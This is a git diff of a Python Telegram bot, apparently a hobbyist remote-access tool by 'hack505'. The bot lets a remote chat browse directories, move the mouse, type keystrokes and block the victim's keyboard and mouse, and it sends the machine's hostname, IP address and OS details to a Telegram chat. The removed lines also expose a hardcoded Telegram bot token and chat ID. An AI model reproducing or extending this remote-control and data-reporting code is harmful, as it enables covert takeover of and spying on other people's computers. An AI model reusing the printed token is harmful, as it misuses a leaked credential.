@@ -1,4 +1,3 @@
-from turtle import up
 from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
 from telegram import Update
 import telegram.ext
@@ -13,26 +12,28 @@ import socket
 import pynput
 import time
 
+
 # Set up logging
 file_name = "app.log"
 logging.basicConfig(filename=file_name, level=logging.DEBUG,
                     format='%(asctime)s - %(levelname)s - %(message)s')
-
 logging.info('-'*500)
+
+# inilazation
+Token = ""
+ChatId = ""
 
 try:
     with open("config.json", 'r') as config_file:
         config = json.load(config_file)
 
-        TOKEN = config.get("token")
-        chat_id = config.get("chat_id")
+        Token = config.get("token")
+        ChatId = config.get("chat_id")
         debug = config.get("debug")
         logging.debug("All information have been imported from json file")
 
 except Exception as e:
     logging.warning(e)
-
-    TOKEN = "6845961407:AAGbKJc7LSpkokCVw-jJg9ByyaLoO3oBT_Q"  # @hack505Mark1bot
 
 
 def cd(update, context):
@@ -65,7 +66,7 @@ def system_info(context):
         system = platform.system()
         machine = platform.machine()
 
-        info_string = (
+        SysInfo_str = (
             f"System Information:\n\n"
             f"Hostname: {hostname}\n"
             f"IP Address: {ip}\n"
@@ -73,9 +74,8 @@ def system_info(context):
             f"System: {system}\n"
             f"Machine: {machine}")
 
-        # Replace 'YOUR_CHAT_ID' with the actual chat ID where you want to send the message
         context.bot.send_message(
-            chat_id="5118057698", text=info_string)
+            chat_id=ChatId, text=SysInfo_str)
     except Exception as e:
         logging.error(e)
 
@@ -115,6 +115,7 @@ def help(update, context):
     /arrow    --> use the arrows key now!
     /cd       --> let's change the dir
     /ls       --> It list the file name
+    /blocker  --> Block the keyboard and mouse 
     $mouse    --> Get the mouse cooradanates
     $type     --> Type anything you want!
                               """)
@@ -123,7 +124,7 @@ def help(update, context):
 
 def content(update, context):
     update.message.reply_text(
-        "this project is owned by hack505 . check out there github page- www.github.com/hack505")
+        "The project is created by hack505 www.github.com/hack505, The author is not responsible for any problem due to this program ")
     logging.debug("a user now our content")
 
 
@@ -309,7 +310,7 @@ def edit_message(update, context):
 # Main handlers
 
 
-updater = telegram.ext.Updater(TOKEN, use_context=True)
+updater = telegram.ext.Updater(Token, use_context=True)
 
 disp = updater.dispatcher
 
